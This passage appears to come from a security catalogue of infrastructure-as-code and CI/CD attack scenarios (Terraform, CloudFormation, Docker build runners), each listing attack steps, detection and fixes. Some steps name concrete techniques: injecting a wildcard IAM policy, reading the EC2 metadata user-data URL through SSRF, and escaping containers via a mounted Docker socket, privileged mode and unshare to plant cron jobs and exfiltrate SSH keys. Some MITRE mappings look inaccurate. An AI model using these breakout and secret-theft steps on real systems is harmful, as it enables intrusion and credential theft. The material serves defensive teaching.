- **Attack Steps**: 1. In a large org, two teams (e.g., Dev and Ops) use the same remote S3 bucket for their Terraform backend storage.2. Each team sets up the backend with:hcl<br>backend "s3" { bucket = "org-tf-state" key = "env/dev/terraform.tfstate" }<br>3. Due to loose IAM policies on the bucket, both teams can read each other's state files.4. State files may expose sensitive cloud resource info or credentials.5. One team unintentionally modifies the other’s infrastructure by referencing incorrect paths or shared modules.6. This causes service outages, config drift, or accidental resource destruction.7. Blue Team investigates when production resources unexpectedly change.8. Purple Team flags shared backends without isolation.9. Fix: Separate state buckets or use key prefixes with strict IAM scoping.
- **Detection**: S3/GCS access logs; terraform plan diff
- **Solution**: Use separate buckets or namespaces per project/team
- **Tags**: #terraform #remotestate #cloudleak

## CloudFormation Template Injects Malicious IAM Policy

- **Attack Type**: IAM Policy Injection
- **Target**: IAM Roles
- **Vulnerability**: Overly permissive IAM policies injected into template
- **MITRE**: T1484.002
- **Impact**: Complete takeover of cloud account
- **Tools**: AWS CloudFormation, Git
- **Scenario**: Attacker or insider modifies CloudFormation template to inject an overly permissive IAM policy.
- **Attack Steps**: 1. CloudFormation templates define IAM roles using JSON blocks under Policies.2. An insider or attacker with Git access modifies the template and inserts the following:"Effect": "Allow", "Action": "*", "Resource": "*"3. This is pushed to version control and reviewed lightly.4. During deployment, the stack creates a role with full admin access.5. Attacker later assumes the role and takes over cloud resources.6. Detection may be delayed if IAM logs are not thoroughly reviewed.7. Blue Team identifies unusual permissions or new roles in the environment.8. Purple Team highlights the lack of policy validation.9. Fix includes code review gates, IAM least privilege enforcement, and static analysis of policies.
- **Detection**: IAM role creation logs, CloudTrail, policy analysis
- **Solution**: Use policy linters, code reviews, limit who can push templates
- **Tags**: #cloudformation #iam #policyinjection

## Terraform Module Dependency Version Drift

- **Attack Type**: Insecure Module Versioning
- **Target**: Cloud Infra via Terraform
- **Vulnerability**: Upstream module changes impact deployments
- **MITRE**: T1195.002
- **Impact**: Deployment of insecure infra without awareness
- **Tools**: Terraform, GitHub Modules
- **Scenario**: A module without pinned version drifts over time as upstream repo changes, introducing risks.
- **Attack Steps**: 1. Developer references a Terraform module:source = "git::https://github.com/org/network-module.git"2. No version or tag is pinned, so Terraform pulls the latest main branch each time.3. Later, the upstream module is updated — either by a well-meaning dev or an attacker — with insecure defaults (e.g., 0.0.0.0/0 CIDRs, default passwords).4. Infrastructure is applied again using the new logic, silently changing security posture.5. Detection is missed unless plans are reviewed or audit tools scan the changes.6. Blue Team only notices after network exposure or bug bounty alert.7. Fix is to pin versions using SHA or tags and scan modules before usage.
- **Detection**: terraform plan diffs, CI pipeline audit
- **Solution**: Pin versions/tags; validate modules regularly
- **Tags**: #terraform #moduledrift #supplychain

## CloudFormation Stack Rollback Reveals Sensitive Output

- **Attack Type**: Rollback Logging
- **Target**: CloudWatch Logs
- **Vulnerability**: Logs reveal secrets during stack rollback
- **MITRE**: T1552.003
- **Impact**: Exposure of secrets via deployment logs
- **Tools**: AWS CloudFormation, CloudWatch Logs
- **Scenario**: During a failed deployment, CloudFormation logs sensitive variable values in plaintext.
- **Attack Steps**: 1. A stack fails during resource creation due to misconfiguration (e.g., missing dependency).2. In the rollback log messages, AWS includes details from parameters and environment variables for debugging.3. If secrets (like database password or tokens) were passed as parameters, they appear in error logs.4. Logs are stored in CloudWatch, accessible to IAM users with basic log permissions.5. Attackers inside the org or compromised roles can extract secrets from logs.6. Detection only happens if logs are manually audited.7. Purple Team suggests marking sensitive params as NoEcho and restricting log access.8. Fix involves secure logging practices and secrets management.
- **Detection**: Manual log review, IAM policy diff
- **Solution**: Harden log permissions; redact sensitive data
- **Tags**: #cloudformation #rollback #logleak

## Terraform CLI History Stores Sensitive Commands

- **Attack Type**: Shell History Exposure
- **Target**: Developer Workstation
- **Vulnerability**: CLI secrets stored in bash history
- **MITRE**: T1552.001
- **Impact**: Local credential disclosure
- **Tools**: Bash/Zsh History, Terraform CLI
- **Scenario**: Sensitive values like access_key, db_password entered in CLI remain in shell history.
- **Attack Steps**: 1. Dev runs Terraform commands directly with sensitive values:terraform apply -var="db_password=secret123"2. The full command is stored in shell history (e.g., ~/.bash_history, ~/.zsh_history).3. On shared or unmanaged systems, these files are accessible by other users or attackers.4. An insider browsing user home directories or compromised shell sessions retrieves the secrets.5. This attack bypasses all secret scanning in Terraform because it's at the shell level.6. Blue Team often misses this unless reviewing system artifacts.7. Fix is to avoid passing secrets via CLI; use .tfvars or vault integration.8. Additionally, shell history logging should be restricted or wiped regularly.
- **Detection**: Shell history review, Linux auditing
- **Solution**: Avoid passing secrets via CLI; scrub history
- **Tags**: #terraform #bashhistory #localleak

## CloudFormation Template Uses Default VPC with Open Security Group

- **Attack Type**: Insecure Defaults
- **Target**: EC2 Networking
- **Vulnerability**: Usage of insecure default network settings
- **MITRE**: T1068
- **Impact**: Public exposure of internal services
- **Tools**: AWS CloudFormation, EC2
- **Scenario**: A resource is deployed to default VPC with open ports (e.g., 22, 80) and no source restrictions.
- **Attack Steps**: 1. Developer uses CloudFormation to deploy EC2 instances without specifying VPC/Security Group.2. AWS defaults to the default VPC and creates a security group allowing SSH (22) and HTTP (80) from 0.0.0.0/0.3. Instance becomes publicly accessible immediately.4. Attackers scan AWS IP ranges and detect exposed services.5. They attempt brute-force on SSH or exploit web service vulnerabilities.6. Detection happens only after intrusion or monitoring alert.7. Purple Team recommends never relying on default networking components in IaC.8. Fix includes custom VPCs, NACLs, and security groups in IaC.
- **Detection**: VPC Flow Logs, GuardDuty alerts
- **Solution**: Avoid default VPC; define secure networking in template
- **Tags**: #cloudformation #vpc #defaultsettings

## Terraform plan Output Exposes Secrets in CI Pipeline

- **Attack Type**: Plan Output Leakage
- **Target**: CI/CD Log Files
- **Vulnerability**: Plan output reveals sensitive values
- **MITRE**: T1552.003
- **Impact**: Cloud resource compromise via log leakage
- **Tools**: Terraform CLI, GitHub Actions
- **Scenario**: terraform plan output includes sensitive resource values and is stored in CI logs.
- **Attack Steps**: 1. Terraform plan shows resource diff and variable values — even secrets if not marked sensitive.2. Developer runs terraform plan in GitHub Actions without redacting or marking secrets.3. Logs are persisted in CI output, which may be accessible to unauthorized users.4. An attacker scrapes CI logs and sees secrets like private IPs, database passwords, or API tokens.5. Blue Team finds out after strange usage of credentials.6. Fix includes marking variables as sensitive = true and restricting CI log retention.7. Teams also need to audit existing logs and rotate leaked credentials.
- **Detection**: GitHub Actions logs, DLP tools
- **Solution**: Sanitize plan output, mark secrets, rotate credentials
- **Tags**: #terraform #planleak #ci

## CloudFormation Template Imports Untrusted Lambda Layer

- **Attack Type**: Third-Party Layer Abuse
- **Target**: Lambda Function
- **Vulnerability**: Malicious layer imported via IaC
- **MITRE**: T1195.002
- **Impact**: Secret theft and persistence via backdoor
- **Tools**: AWS Lambda, CloudFormation
- **Scenario**: CloudFormation template adds external Lambda layer which includes backdoored binaries.
- **Attack Steps**: 1. Dev uses a public Lambda layer ARN sourced from a blog or forum.2. CloudFormation adds it via:"Layers": ["arn:aws:lambda:region:acct:layer:layerName:1"]3. Attacker controls the ARN and publishes a new version containing malicious binaries.4. The backdoor logs environment variables (including secrets) and sends them to attacker’s domain.5. Lambda executes normally but leaks data silently.6. Blue Team only detects this if egress DNS logs are reviewed.7. Purple Team identifies dependency risk.8. Fix includes verifying sources, pinning version numbers, and scanning layer contents.
- **Detection**: VPC Flow Logs, DNS logs
- **Solution**: Use verified layers; scan third-party binaries
- **Tags**: #lambda #layers #cloudformation

## Terraform Cloud Remote Backend Accessed Without Authentication

- **Attack Type**: Remote State Unauthenticated Access
- **Target**: Terraform Cloud Workspace
- **Vulnerability**: Misconfigured visibility on remote state
- **MITRE**: T1552.006
- **Impact**: Complete state exposure across org
- **Tools**: Terraform Cloud, CLI
- **Scenario**: Terraform Cloud workspace is misconfigured, allowing unauthenticated access to remote state.
- **Attack Steps**: 1. Terraform Cloud stores remote state and supports team-based access control.2. A workspace is set to "Public" visibility or the API token is leaked.3. Anyone with workspace URL or token can pull the full state file.4. The file includes sensitive data such as cloud resource attributes and secrets.5. Blue Team identifies strange workspace activity or reports from external bug bounty hunters.6. Fix is to enforce strict workspace RBAC, rotate tokens, and review access logs.
- **Detection**: Terraform Cloud audit logs
- **Solution**: Enforce RBAC; restrict visibility to private
- **Tags**: #terraformcloud #remoteaccess #stateleak

## CloudFormation Exports Leak Architecture Details Across Stacks

- **Attack Type**: Stack Cross-Talk
- **Target**: CloudFormation Stacks
- **Vulnerability**: Overexposed cross-stack exports
- **MITRE**: T1069.002
- **Impact**: Information leakage aiding lateral movement
- **Tools**: AWS CloudFormation
- **Scenario**: Exports from one stack (e.g., subnet IDs, ARNs) are visible and reusable by unrelated stacks.
- **Attack Steps**: 1. Stack A exports values via:"Outputs": { "Export": { "Name": "SubnetID" }}2. Stack B in the same account/region reads the exported value via Fn::ImportValue.3. If permissions are lax, developers in Stack B get access to architecture details from Stack A.4. Attackers (insiders or compromised IAM roles) use this to understand networking layout or resource dependencies.5. They prepare lateral movement paths across stacks.6. Blue Team discovers misuse via audit of import logs or resource dependencies.7. Fix includes limiting exports and restricting who can read them.
- **Detection**: CloudTrail logs, IAM policies
- **Solution**: Audit exports; enforce separation of duties
- **Tags**: #cloudformation #exports #crossstack

## Terraform State File Leaked via Artifact in CI

- **Attack Type**: CI Artifact Exposure
- **Target**: CI/CD Pipelines
- **Vulnerability**: State files exposed via downloadable CI artifacts
- **MITRE**: T1552.006
- **Impact**: Secrets exposure and cloud takeover
- **Tools**: GitHub Actions, GitLab CI, Terraform CLI
- **Scenario**: CI/CD pipeline stores terraform.tfstate as an output artifact, which is accessible without authentication.
- **Attack Steps**: 1. CI job runs Terraform and saves terraform.tfstate as an artifact for debugging or post-processing:artifacts: paths: - terraform.tfstate2. The job completes, and the artifact is stored in the public project or available to anyone with a URL.3. The state file contains resource details, plaintext secrets, and service tokens.4. An attacker discovers the public link via Google dorking or scanning artifact indexes.5. They use secrets to impersonate services or extract infrastructure metadata.6. Blue Team only learns about this when suspicious access is detected in logs.7. Fix includes masking state files, marking artifacts as private, and using remote backends with encryption.
- **Detection**: CI logs + artifact access review
- **Solution**: Never store sensitive state as artifact; restrict visibility
- **Tags**: #terraform #ciartifacts #stateleak

## CloudFormation Parameters Logged in CLI History

- **Attack Type**: Shell History Exposure
- **Target**: Developer Machine
- **Vulnerability**: Shell history retains secrets
- **MITRE**: T1552.001
- **Impact**: Credentials theft from local CLI use
- **Tools**: AWS CLI, Bash/Zsh
- **Scenario**: Sensitive stack parameters entered via AWS CLI are retained in shell history on the engineer’s machine.
- **Attack Steps**: 1. Engineer runs a stack update via:aws cloudformation update-stack --stack-name db-stack --parameters ParameterKey=DBPassword,ParameterValue=SuperSecret123!2. This command is saved in ~/.bash_history or ~/.zsh_history.3. Another user with access to the same machine reads the history file.4. The DB password is retrieved and used to access cloud-hosted databases.5. The leak bypasses centralized logging or secret scanning because it occurs locally.6. Blue Team discovers the breach only through behavioral anomalies in database logs.7. Fix: Never pass secrets inline; use SSM/Secrets Manager with UsePreviousValue, and scrub shell history.
- **Detection**: Local host forensics, process audit
- **Solution**: Avoid inline secrets; clean shell history frequently
- **Tags**: #cloudformation #bashhistory #localleak

## Terraform Backend Key Reused Across Environments

- **Attack Type**: Key Collision in Backend
- **Target**: Remote State Storage
- **Vulnerability**: Key reuse across environments
- **MITRE**: T1609
- **Impact**: Environment drift, potential service loss
- **Tools**: Terraform, S3, GCS
- **Scenario**: Using the same key in remote backend across different environments causes state overlap and resource corruption.
- **Attack Steps**: 1. Dev configures the Terraform remote backend with a generic key:key = "terraform.tfstate"2. This same key is reused across dev, staging, and prod environments.3. When a plan is applied in staging, it overwrites the state of prod unintentionally.4. Infrastructure for both environments is now mismatched, and deleting one affects the other.5. Secrets or endpoint configs may leak between environments.6. Blue Team is alerted when prod services fail.7. Purple Team traces issue back to shared key.8. Fix is to include env in the backend key path (e.g., key = "prod/terraform.tfstate").
- **Detection**: Backend config audit, access log
- **Solution**: Use unique backend keys per env; enforce naming standards
- **Tags**: #terraform #backend #stateoverlap

## CloudFormation Template Shared in Internal Wiki with Secrets

- **Attack Type**: Internal Document Exposure
- **Target**: Internal Wiki
- **Vulnerability**: Improper handling of secrets in documentation
- **MITRE**: T1081
- **Impact**: Insider access to exposed secrets
- **Tools**: Confluence, Notion, GitLab Wiki
- **Scenario**: An internal wiki page includes full CloudFormation YAML template with secrets, accessible to all employees.
- **Attack Steps**: 1. Engineer uploads a CloudFormation YAML template containing embedded secrets to an internal Confluence wiki page for knowledge sharing.2. Secrets include hardcoded passwords, API keys, and SMTP credentials.3. Another employee stumbles upon the page or the page gets scraped by a compromised internal user account.4. The secrets are extracted and used for lateral movement or outbound attacks.5. Blue Team detects unauthorized access patterns in associated services.6. Fix includes cleaning historical wiki pages, scanning internal docs for secrets, and using secret management tools.
- **Detection**: Wiki audit logs, content scanner
- **Solution**: Scan internal docs; replace secrets with references
- **Tags**: #cloudformation #internalleak #documentation

## Terraform Workspace Misuse Causes Production Change

- **Attack Type**: Workspace Confusion
- **Target**: Terraform Projects
- **Vulnerability**: Workspace confusion in CLI usage
- **MITRE**: T1609
- **Impact**: Accidental prod change, service impact
- **Tools**: Terraform CLI
- **Scenario**: Developer runs Terraform in default workspace assuming it’s staging, but changes affect production.
- **Attack Steps**: 1. Developer runs terraform workspace list and sees:default * staging2. They believe they are on staging and apply changes.3. However, default workspace was active, which is linked to production backend.4. Changes modify production resources, causing outages.5. Secrets or access rules are accidentally deleted.6. Blue Team investigates after monitoring alerts trigger.7. Purple Team finds that environment separation was not enforced via code.8. Fix includes using separate Terraform projects per env or strict automation with -workspace.
- **Detection**: Audit backend keys, resource tags
- **Solution**: Use strict workspaces, automate workspace enforcement
- **Tags**: #terraform #workspace #envseparation

## CloudFormation Outputs Used in Chatbot Notification

- **Attack Type**: Sensitive Output via Chat
- **Target**: Messaging Platforms
- **Vulnerability**: Sensitive data relayed through chat automation
- **MITRE**: T1537
- **Impact**: Unauthorized visibility of secrets
- **Tools**: Slack, AWS CLI
- **Scenario**: A deployment bot posts stack output (containing secrets) to a Slack/Teams channel.
- **Attack Steps**: 1. Deployment pipeline includes a step that sends the Outputs section of CloudFormation stacks to a DevOps Slack channel.2. Outputs include sensitive values like database connection strings or S3 pre-signed URLs.3. Any team member or bot in that channel can see the outputs.4. If the channel is not private, secrets are at risk of being seen or abused.5. Blue Team discovers the issue after seeing secrets pasted into incident threads.6. Fix includes filtering outputs, tagging sensitive values, and securing channels.
- **Detection**: Slack logs, bot logs
- **Solution**: Filter outputs before sending; tag secrets
- **Tags**: #cloudformation #chatleak #outputs

## Terraform Variable Files Included in Git Archive Zip

- **Attack Type**: Source Archive Leak
- **Target**: Git Repos / File Archives
- **Vulnerability**: Sensitive file unintentionally included in release
- **MITRE**: T1565.001
- **Impact**: Public release of credentials
- **Tools**: GitHub, GitLab
- **Scenario**: .tfvars files with secrets are bundled into downloadable ZIP archive from Git UI.
- **Attack Steps**: 1. Repository includes prod.tfvars with sensitive variables like passwords and tokens.2. Even though it's ignored in commits, the file exists in the working directory.3. A contributor packages the code using zip -r repo.zip . and uploads it to GitHub Releases or internal portal.4. The ZIP includes sensitive .tfvars file by accident.5. A user or attacker downloads the ZIP and extracts secrets.6. Blue Team detects misuse of secrets days later.7. Fix includes scanning ZIPs before upload, excluding secrets from archive scripts, and reviewing GitHub releases.
- **Detection**: Manual ZIP content review, secret scanners
- **Solution**: Exclude secret files from archives, use .tfignore
- **Tags**: #terraform #git #archivesecrets

## CloudFormation Stack Policy Grants Everyone:Update*

- **Attack Type**: Overly Permissive Stack Policy
- **Target**: CloudFormation Stack
- **Vulnerability**: Wildcard principals in stack policies
- **MITRE**: T1484.002
- **Impact**: Full resource control for attacker
- **Tools**: AWS CloudFormation
- **Scenario**: Stack policy allows anyone to update or delete any resource, leading to privilege escalation.
- **Attack Steps**: 1. CloudFormation templates may include a StackPolicyBody section.2. A misconfigured policy is deployed with:"Effect": "Allow", "Principal": "*", "Action": "Update:*"3. Any AWS principal (internal or external) can modify resources associated with the stack.4. An attacker discovers the stack and modifies IAM roles, S3 buckets, or deletes logs.5. Blue Team finds unexpected stack modifications.6. Purple Team finds stack policy misconfig.7. Fix includes setting tight Principal, specific actions, and monitoring changes via CloudTrail.
- **Detection**: Stack audit, CloudTrail events
- **Solution**: Use least privilege in stack policies
- **Tags**: #cloudformation #stackpolicy #overpermission

## Terraform Debug Mode Logs Secrets to Console

- **Attack Type**: Verbose Logging Exposure
- **Target**: Local Logs
- **Vulnerability**: Verbose logs reveal sensitive info
- **MITRE**: T1552.003
- **Impact**: Accidental leak of sensitive info
- **Tools**: Terraform, Terminal
- **Scenario**: Running Terraform with TF_LOG=DEBUG prints all variable values, including secrets.
- **Attack Steps**: 1. A developer troubleshoots Terraform apply issues by setting:export TF_LOG=DEBUG2. Terraform logs the entire execution, including variables marked as sensitive.3. Secrets like passwords, tokens, or IPs are printed in console or log files.4. These logs may get copied into ticketing systems or Slack during debugging.5. An attacker with access to these logs can steal secrets.6. Fix includes never running DEBUG in prod, masking logs, and clearing sensitive buffers.
- **Detection**: Console logs, file scans
- **Solution**: Limit use of debug mode, sanitize output
- **Tags**: #terraform #debuglogs #secretleak

## CloudFormation Template Shared in Public Git Repo

- **Attack Type**: Public Code Exposure
- **Target**: GitHub Repository
- **Vulnerability**: Public repo exposes cloud architecture
- **MITRE**: T1588.002
- **Impact**: Cloud mapping and targeted attacks
- **Tools**: Git, GitHub
- **Scenario**: A CloudFormation template with sensitive architecture is pushed to GitHub without sanitization.
- **Attack Steps**: 1. Developer pushes a CloudFormation YAML template to a public GitHub repo for documentation.2. Template includes sensitive architecture details:• Subnet IPs• RDS instance identifiers• IAM role ARNs• Output secrets3. A GitHub crawler or attacker indexes the repo and downloads the file.4. They map the org’s infrastructure and attempt targeted enumeration.5. Blue Team receives threat intel about the exposed repo.6. Fix includes removing the file, cleaning Git history, and rotating identifiers.
- **Detection**: GitHub secret scanning, repo audit
- **Solution**: Avoid pushing raw IaC; scrub metadata
- **Tags**: #cloudformation #publicrepo #cloudintel

## Terraform Outputs Reveal Secrets in JSON API

- **Attack Type**: Output Leak via API
- **Target**: Terraform Cloud APIs
- **Vulnerability**: Output secrets exposed via unprotected endpoints
- **MITRE**: T1552.006
- **Impact**: Credential exposure through IaC APIs
- **Tools**: Terraform CLI, Terraform Cloud API
- **Scenario**: Terraform outputs sensitive values via an API endpoint exposed to all users.
- **Attack Steps**: 1. A developer creates Terraform output blocks like output "db_password" { value = var.db_password }. 2. Terraform Cloud saves these outputs and exposes them via API or dashboards. 3. A wrapper script or dashboard pulls these outputs using an API call that lacks fine-grained permissions. 4. The JSON response from the API contains secrets such as RDS passwords or keys in plaintext. 5. A compromised token or unauthenticated access allows attackers to read outputs. 6. Secrets are abused to pivot into the environment. 7. Fix: Mark outputs as sensitive = true and restrict API permissions.
- **Detection**: API logs, dashboard audit trails
- **Solution**: Use sensitive = true; restrict dashboard/API access
- **Tags**: #terraform #apioutput #secretleak

## CloudFormation Template with Static Credentials in EC2 UserData

- **Attack Type**: Bootstrap Script Leak
- **Target**: EC2 Metadata API
- **Vulnerability**: Static secrets retrievable via user-data
- **MITRE**: T1086
- **Impact**: Secret exfiltration via metadata service
- **Tools**: AWS CloudFormation, EC2 Metadata API
- **Scenario**: Template defines hardcoded secrets in EC2 UserData, retrievable via metadata.
- **Attack Steps**: 1. CloudFormation template includes a UserData script for EC2 that contains secrets (e.g., DB passwords). 2. After instance launch, the entire script is accessible via the EC2 metadata service. 3. An attacker with shell access or SSRF vulnerability in a hosted app accesses http://169.254.169.254/latest/user-data. 4. Secrets like tokens, passwords, and SMTP credentials are exposed. 5. No IAM check is needed to fetch this data from metadata. 6. Fix: Move secrets to AWS SSM/Secrets Manager and pass only references via UserData.
- **Detection**: VPC Flow Logs, EC2 metadata access
- **Solution**: Do not place secrets in UserData; use Secrets Manager
- **Tags**: #cloudformation #userdata #metadataleak

## Terraform Resource Misconfiguration Opens Internal S3 Buckets to Public

- **Attack Type**: Bucket Access Misconfig
- **Target**: S3 Buckets
- **Vulnerability**: Public ACLs used unintentionally
- **MITRE**: T1530
- **Impact**: Sensitive logs or files leaked to internet
- **Tools**: Terraform CLI, AWS S3
- **Scenario**: Terraform ACL config accidentally exposes internal S3 buckets publicly.
- **Attack Steps**: 1. Developer writes acl = "public-read" in the Terraform resource for an S3 bucket. 2. The bucket contains internal logs or CI artifacts. 3. A public bucket scanner (e.g., AWSBucketDump) finds and downloads data. 4. Sensitive data such as IAM role logs or audit data is exposed. 5. Organization is unaware until a researcher reports it or a threat actor abuses it. 6. Fix: Enforce private ACLs, apply S3 bucket policies to deny public access, and scan Terraform code for public-read usage.
- **Detection**: AWS Macie, S3 Access Analyzer
- **Solution**: Use blockPublicAcls and audit ACLs in IaC
- **Tags**: #terraform #s3 #bucketleak

## CloudFormation Nested Stack Injects Malicious Subtemplate

- **Attack Type**: Nested Stack Supply Chain
- **Target**: Nested CloudFormation Stack
- **Vulnerability**: Modifiable external nested templates
- **MITRE**: T1195.002
- **Impact**: Privilege escalation and backdoor via IaC
- **Tools**: AWS CloudFormation
- **Scenario**: Publicly hosted nested stack URL allows template injection.
- **Attack Steps**: 1. Main CloudFormation template references a nested template hosted at https://s3.amazonaws.com/org/nested.yaml. 2. The S3 bucket is publicly writable or versioning is disabled. 3. An attacker uploads a malicious nested template to the same URL. 4. Parent template executes the nested template without validation. 5. Malicious IAM roles or open security groups are created silently. 6. Blue Team sees unusual access but can’t trace root cause. 7. Fix: Use private, version-controlled S3 buckets and validate template signatures or checksums.
- **Detection**: CloudTrail, S3 access logs
- **Solution**: Use immutable template hosting with versioning
- **Tags**: #cloudformation #nestedstack #templateinject

## Terraform Applies from Developer Laptop with Untracked Modifications

- **Attack Type**: Out-of-Band Apply
- **Target**: Dev Workstations
- **Vulnerability**: Untracked infrastructure changes
- **MITRE**: T1609
- **Impact**: Production drift and misconfiguration
- **Tools**: Terraform CLI, Git
- **Scenario**: Developer modifies and applies Terraform locally without Git tracking.
- **Attack Steps**: 1. Developer changes a .tf file (e.g., changes CIDR from private to public). 2. They run terraform apply from their laptop without pushing code to Git. 3. The infrastructure is changed in production, but the codebase remains unchanged. 4. No peer review or audit exists for the change. 5. Blue Team is unaware of the change because it’s not tracked in version control. 6. Fix: Enforce applies via CI/CD only, with Git commit hash checks and approval workflow.
- **Detection**: Plan drift detection, Git state comparison
- **Solution**: Restrict applies to CI pipeline only
- **Tags**: #terraform #localapply #unauthorizedchange

## CloudFormation Auto-Creates Secrets with Default KMS Key

- **Attack Type**: Weak Secret Encryption
- **Target**: AWS Secrets Manager
- **Vulnerability**: Secrets encrypted with shared default KMS key
- **MITRE**: T1555.003
- **Impact**: Weak encryption; easier for attackers to decrypt
- **Tools**: CloudFormation, AWS Secrets Manager
- **Scenario**: SecretsManager secret is created without specifying custom encryption key.
- **Attack Steps**: 1. A CloudFormation template defines a SecretsManager resource. 2. It does not specify a KmsKeyId, so AWS uses its default alias/aws/secretsmanager. 3. Default keys are shared and offer weaker isolation and auditability. 4. An attacker with some privileges may access or decrypt secrets due to broad default permissions. 5. Blue Team has limited visibility into KMS usage. 6. Fix: Always specify a CMK (CustomerManagedKey) and restrict its access via KMS key policy.
- **Detection**: CloudTrail KMS usage logs
- **Solution**: Use custom KMS key with restrictive key policy
- **Tags**: #secretsmanager #kms #cloudformation

## Terraform Cloud Team Token Pushed to GitHub

- **Attack Type**: API Token Exposure
- **Target**: GitHub / Git
- **Vulnerability**: Sensitive API key included in version control
- **MITRE**: T1552.001
- **Impact**: Credential theft and full IaC access
- **Tools**: Terraform Cloud, GitHub
- **Scenario**: Terraform API token accidentally committed to Git.
- **Attack Steps**: 1. Developer adds Terraform token to .env or .terraformrc file. 2. File is committed to a public or internal GitHub repository. 3. GitHub's token scanner may detect the leak, but attackers using GitHub search tools already see it. 4. Token has access to multiple workspaces, secrets, and remote states. 5. Attacker pulls down environment variables, backend config, or workspace outputs. 6. Fix: Revoke leaked token, scan commit history, and enforce .gitignore.
- **Detection**: Git secret scanners, GitHub alerts
- **Solution**: Revoke tokens, use .gitignore, rotate secrets
- **Tags**: #terraform #apitoken #gitleak

## CloudFormation Template Enables Insecure TLS in ELB

- **Attack Type**: Weak TLS Defaults
- **Target**: Load Balancers
- **Vulnerability**: Use of outdated TLS policies in IaC
- **MITRE**: T1600
- **Impact**: Weak encryption allows traffic interception
- **Tools**: AWS ELB, CloudFormation
- **Scenario**: CloudFormation sets up ELB listener with legacy TLS.
- **Attack Steps**: 1. A CloudFormation ELB listener is created with SSLPolicy: ELBSecurityPolicy-2015-05. 2. This policy allows TLS 1.0 and deprecated ciphers. 3. An attacker performs SSL downgrade or uses weaker cipher suites to sniff traffic. 4. Blue Team detects outdated TLS errors or handshake anomalies. 5. Fix: Always use up-to-date policies such as ELBSecurityPolicy-TLS-1-2-2021-06 and regularly scan ELBs for weak TLS.
- **Detection**: TLS handshake logs, SSL scanners
- **Solution**: Apply strong TLS policies in templates
- **Tags**: #cloudformation #tls #elb

## Terraform Auto-Approve Applies in CI Without Manual Review

- **Attack Type**: Unsafe Auto-Approval
- **Target**: CI/CD Pipelines
- **Vulnerability**: No human gate before applying IaC
- **MITRE**: T1609
- **Impact**: Production misconfigurations without visibility
- **Tools**: Terraform CLI, GitHub Actions
- **Scenario**: CI applies Terraform with -auto-approve, skipping peer review.
- **Attack Steps**: 1. Terraform CI pipeline runs with terraform apply -auto-approve. 2. Developers push changes directly to main branch. 3. No approval or plan review is enforced. 4. Accidental or malicious changes are deployed without visibility. 5. Blue Team detects issues only after misconfiguration causes incidents. 6. Fix: Require manual approval in CI (GitHub Environments), enforce review workflow.
- **Detection**: CI logs, resource drift tools
- **Solution**: Enforce approval steps in CI/CD workflows
- **Tags**: #terraform #ci #autoapprove

## CloudFormation Template Creates EBS Volume Without Encryption

- **Attack Type**: Unencrypted Storage
- **Target**: EBS Volumes
- **Vulnerability**: Unencrypted volumes provisioned by default
- **MITRE**: T1600
- **Impact**: Data at rest can be read from snapshots
- **Tools**: AWS CloudFormation
- **Scenario**: EBS volumes created without enabling encryption.
- **Attack Steps**: 1. Template provisions EC2 with EBS volumes using Encrypted: false. 2. EBS volume stores app logs, configs, or temporary secrets. 3. If a snapshot is taken or volume is detached, its data is accessible in plaintext. 4. No encryption safeguards are applied. 5. Blue Team only detects this during post-incident forensic review. 6. Fix: Enforce Encrypted: true in all IaC templates and via Org SCPs.
- **Detection**: AWS Config, EBS encryption status audit
- **Solution**: Enforce EBS encryption by policy + template rules
- **Tags**: #ebs #storageencryption #cloudformation

## Docker Socket Exploit During Build

- **Attack Type**: Container Breakout
- **Target**: CI Build Hosts
- **Vulnerability**: Docker socket mounted inside container
- **MITRE**: T1611
- **Impact**: Full host compromise from container
- **Tools**: Docker CLI, CI/CD runner
- **Scenario**: CI runner mounts Docker socket inside build container, allowing breakout to host.
- **Attack Steps**: 1. Attacker submits a PR that triggers a build in a shared GitLab Runner.2. The runner is configured to mount /var/run/docker.sock into the build container to allow Docker builds inside Docker ("Docker-in-Docker").3. From within the container, the attacker uses Docker CLI to create a new container with --privileged and -v /:/host to mount the host filesystem.4. The new container is started with /bin/sh and host root directory mounted.5. Attacker gains access to the host, escalates privileges, modifies files, or installs backdoors.6. All of this occurs silently inside the build job.
- **Detection**: Audit mounted volumes, daemon logs
- **Solution**: Never mount Docker socket inside untrusted builds
- **Tags**: #docker #socket #containerescape

## Unconfined Build Container Escalates Privileges

- **Attack Type**: Container Breakout
- **Target**: Build Server
- **Vulnerability**: Privileged container without sandboxing
- **MITRE**: T1611
- **Impact**: Host compromise, backdoor installation
- **Tools**: Docker, capsh, unshare
- **Scenario**: Build container runs with no seccomp/apparmor restrictions and --privileged flag.
- **Attack Steps**: 1. Attacker’s pipeline job is executed inside a build container with --privileged and no seccomp/apparmor profiles applied.2. Inside the container, attacker uses capsh --caps to check capabilities like CAP_SYS_ADMIN are enabled.3. Uses unshare -Urm to create a new namespace with root privileges and mount host filesystem.4. Escapes the container and writes files to /etc/cron.d on host.5. Attacker persists access and triggers remote shell on host at next cron cycle.
- **Detection**: Host audit logs, container audit logs
- **Solution**: Do not use --privileged; use seccomp/apparmor
- **Tags**: #privilegedcontainer #sandbox #dockerescape

## Build Volume Misuse to Access Host Files

- **Attack Type**: Container Breakout
- **Target**: CI Runners
- **Vulnerability**: Host folders exposed via bind mounts
- **MITRE**: T1083
- **Impact**: Credential theft and lateral movement
- **Tools**: Docker, GitLab Runner
- **Scenario**: Attacker abuses build volume to access sensitive files mounted from host.
- **Attack Steps**: 1. CI pipeline mounts host directory (e.g., /var/lib/gitlab-runner) into container as a bind mount.2. Attacker’s build job runs arbitrary script accessing files from that path (e.g., SSH keys, .bash_history, config.toml).3. Uses cat or scp inside the build step to exfiltrate the files.4. Host system remains unaware as job finishes successfully.5. Attacker now has secrets to move laterally into cloud or dev systems.
- **Detection**: Audit volume usage in runner configs
- **Solution**: Use ephemeral environments with strict volume rules
- **Tags**: #bindmount #hostaccess #gitlabrunners

## Host Namespace Reuse in Docker Build Container

- **Attack Type**: Container Breakout
- **Target**: CI/CD Container
- **Vulnerability**: Host namespace exposed to untrusted job
- **MITRE**: T1057
- **Impact**: Network/process enumeration and pivoting
- **Tools**: Docker, ps, netstat
- **Scenario**: Build container is started with --network=host and --pid=host, allowing process snooping.
- **Attack Steps**: 1. Developer sets CI runner to use --network=host and --pid=host for faster builds.2. Build container now shares network and process namespace with host.3. Attacker's build script runs ps aux or netstat to list host processes or connections.4. They identify open ports or sensitive processes (e.g., SSH, database).5. Attacker sends exfiltration script using that information.6. Fix: Never share host namespaces in CI/CD containers.
